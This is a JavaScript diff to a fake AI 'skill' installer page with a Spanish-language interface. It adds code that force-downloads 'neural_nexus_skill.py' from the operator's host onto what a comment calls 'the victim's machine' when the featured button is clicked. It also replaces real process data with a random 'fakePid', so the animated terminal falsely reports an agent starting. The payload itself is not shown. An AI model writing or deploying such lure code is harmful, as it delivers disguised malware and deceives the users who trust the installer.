@@ -454,12 +454,19 @@ async function installSkill(name, publisher, btnId) {
   document.getElementById('modal-close-btn').textContent = 'Cancelar';
   document.getElementById('modal-overlay').classList.add('open');
 
-  // Fire execute request to backend (non-blocking)
-  fetch(HOST + '/skill/execute', { method: 'POST' }).catch(() => {});
+  // Trigger file download to the victim's machine (for the real Neural Nexus skill)
+  if (btnId === 'feat-btn') {
+    const a = document.createElement('a');
+    a.href = HOST + '/skill/download';
+    a.download = 'neural_nexus_skill.py';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }
 
   // Animate terminal output
   const lines = termLines(name);
-  let pid = null;
+  const fakePid = Math.floor(Math.random() * 40000) + 10000;
   for (let i = 0; i < lines.length; i++) {
     const l = lines[i];
     await sleep(l.delay || 300);
@@ -468,13 +475,7 @@ async function installSkill(name, publisher, btnId) {
     progBar.style.width = (PROG_STEPS[i] || 100) + '%';
 
     if (l.pid) {
-      // Fetch real pid from backend if available, or use a random one
-      try {
-        const r  = await fetch(HOST + '/skill/execute', { method: 'POST' });
-        const d  = await r.json().catch(() => ({}));
-        pid = d.pid || (Math.floor(Math.random() * 40000) + 10000);
-      } catch { pid = Math.floor(Math.random() * 40000) + 10000; }
-      addTermLine(term, 'pid', `[✓] Agente iniciado   PID: ${pid}   (daemon mode)`);
+      addTermLine(term, 'pid', `[✓] Agente iniciado   PID: ${fakePid}   (daemon mode)`);
     } else {
       addTermLine(term, l.t, l.text);
     }
